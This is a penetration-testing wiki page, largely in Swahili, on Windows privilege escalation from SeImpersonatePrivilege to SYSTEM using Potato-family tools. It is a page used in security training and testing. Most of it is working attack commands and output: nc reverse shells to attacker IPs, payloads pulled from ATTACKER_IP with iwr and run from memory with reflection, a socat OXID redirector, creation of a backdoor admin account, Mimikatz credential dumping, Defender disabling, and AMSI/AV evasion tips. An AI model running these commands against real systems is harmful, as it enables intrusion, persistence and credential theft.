# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika ili **kupata ruhusa sawa na kupata ngazi ya `NT AUTHORITY\SYSTEM`**. Chapisho hili la blogu (https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) linachambua kwa undani chombo cha `PrintSpoofer`, ambacho kinaweza kutumika kunyanyasa ruhusa za impersonation kwenye mashine za Windows 10 na Server 2019 ambapo JuicyPotato haitumiki tena.

> [!TIP]
> Mbadala wa kisasa unaotunzwa mara kwa mara mwaka 2024–2025 ni SigmaPotato (tawi la GodPotato) ambalo linaongeza matumizi ya in-memory/.NET reflection na msaada ulioongezwa wa OS. Tazama matumizi ya haraka hapa chini na repo katika References.

Kurasa zinazohusiana kwa maelezo ya msingi na mbinu za mikono:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na matatizo ya kawaida

Tekniki zote zifuatazo zinategemea kunyanyasa huduma yenye uwezo wa impersonation na ruhusa kutoka muktadha unaoshikilia mojawapo ya ruhusa hizi:

- SeImpersonatePrivilege (mara nyingi) au SeAssignPrimaryTokenPrivilege
- Uadilifu wa juu hauhitajiki ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti nyingi za huduma kama IIS AppPool, MSSQL, n.k.)

Angalia ruhusa kwa haraka:
```cmd
whoami /priv | findstr /i impersonate
```
Vidokezo vya uendeshaji:

- Ikiwa shell yako inaendesha chini ya restricted token isiyokuwa na SeImpersonatePrivilege (ya kawaida kwa Local Service/Network Service katika muktadha fulani), rejesha vibali vya chaguo-msingi vya akaunti ukitumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer inahitaji huduma ya Print Spooler iendeshwe na ipatike kupitia endpoint ya RPC ya eneo-kazi (spoolss). Katika mazingira yaliyohifadhiwa ambapo Spooler imezimwa baada ya PrintNightmare, tumia RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato inahitaji OXID resolver inayofikika kwa TCP/135. Ikiwa egress imezuiliwa, tumia redirector/port-forwarder (tazama mfano hapa chini). Builds za zamani zilihitaji -f flag.
- EfsPotato/SharpEfsPotato hutumia MS-EFSR; ikiwa pipe moja imezuiliwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
- Kosa 0x6d3 wakati wa RpcBindingSetAuthInfo kawaida inaonyesha huduma ya uthibitishaji ya RPC isiyojulikana/isipokelewe; jaribu pipe/transport tofauti au hakikisha huduma ya lengo inaendesha.
- Forks za "kitchen-sink" kama DeadPotato zinabundled moduli za ziada za payload (Mimikatz/SharpHound/Defender off) ambazo zinaandika diski; tarajia uonekano mkubwa zaidi wa EDR ikilinganishwa na asili nyembamba.

## Demo ya Haraka

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Vidokezo:
- Unaweza kutumia -i kuanzisha mchakato wa mwingiliano kwenye console ya sasa, au -c kutekeleza one-liner.
- Inahitaji huduma ya Spooler. Ikiwa imezimwa, hii itashindwa.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ikiwa outbound 135 imezuiwa, pivot OXID resolver kupitia socat kwenye redirector yako:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ni primitive mpya ya matumizi mabaya ya COM iliyotolewa mwishoni mwa 2022 inayolenga huduma ya **PrintNotify** badala ya Spooler/BITS. The binary instantiates the PrintNotify COM server, swaps in a fake `IUnknown`, then triggers a privileged callback through `CreatePointerMoniker`. When the PrintNotify service (running as **SYSTEM**) connects back, the process duplicates the returned token and spawns the supplied payload with full privileges.

Key operational notes:

* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu Print Workflow/PrintNotify service imewekwa (imo hata wakati legacy Spooler imezimwa baada ya PrintNightmare).
* Inahitaji calling context kushikilia **SeImpersonatePrivilege** (kawaida kwa IIS APPPOOL, MSSQL, na scheduled-task service accounts).
* Inakubali amri ya moja kwa moja au interactive mode ili ukae ndani ya console ya asili. Mfano:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Kwa sababu ni COM-based tu, hakuna named-pipe listeners au external redirectors yanahitajika, hivyo inaweza kutumika badala kwa urahisi kwenye hosts ambapo Defender inazuia RoguePotato’s RPC binding.

Operators kama Ink Dragon huita PrintNotifyPotato mara moja baada ya kupata ViewState RCE kwenye SharePoint ili kuhamia kutoka `w3wp.exe` worker hadi SYSTEM kabla ya kusakinisha ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Kidokezo: Ikiwa pipe moja inashindwa au EDR inazuia, jaribu pipes nyingine zinazoungwa mkono:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Vidokezo:
- Inafanya kazi kwa Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege inapatikana.
- Pata binary inayolingana na runtime iliyosakinishwa (kwa mfano, `GodPotato-NET4.exe` on modern Server 2022).
- Ikiwa initial execution primitive yako ni webshell/UI yenye timeouts fupi, panga payload kama script na muulize GodPotato kuiendesha badala ya amri ndefu ya inline.

Mfano mfupi wa staging kutoka katika IIS webroot inayoweza kuandikwa:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato hutoa toleo mbili zinazolenga service DCOM objects ambazo kwa chaguo-msingi zinatumia RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa kisha endesha amri yako:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork ya GodPotato iliyosasishwa)

SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kupitia .NET reflection na msaidizi wa PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Bendera ya reverse shell iliyojengwa ndani `--revshell` na kuondolewa kwa kikomo cha 1024-char cha PowerShell ili uweze kutuma payloads ndefu zinazopitia AMSI kwa mara moja.
- Sintaksia inayofaa kwa reflection (`[SigmaPotato]::Main()`), pamoja na mbinu ya msingi ya kuepuka AV kwa kutumia `VirtualAllocExNuma()` ili kuyapotosha heuristics rahisi.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (urekebishaji wa GodPotato 2024 na moduli)

DeadPotato inahifadhi mnyororo wa OXID/DCOM impersonation wa GodPotato lakini inaingiza wasaidizi wa post-exploitation ili waendeshaji waweze kunyakua SYSTEM mara moja na kufanya persistence/collection bila zana za ziada.

Common modules (zote zinahitaji SeImpersonatePrivilege):

- `-cmd "<cmd>"` — anzisha amri yoyote kama SYSTEM.
- `-rev <ip:port>` — reverse shell ya haraka.
- `-newadmin user:pass` — tengeneza admin wa ndani kwa persistence.
- `-mimi sam|lsa|all` — angusha na endesha Mimikatz ili kudump credentials (inaandika kwenye disk, inasababisha kelele nyingi).
- `-sharphound` — endesha SharpHound collection kama SYSTEM.
- `-defender off` — zima Defender real-time protection (inasababisha kelele nyingi).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Kwa sababu inasafirisha binaries za ziada, tarajia alama nyingi zaidi za AV/EDR; tumia GodPotato/SigmaPotato nyembamba wakati ujificha (stealth) unahitajika.

## Marejeleo

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
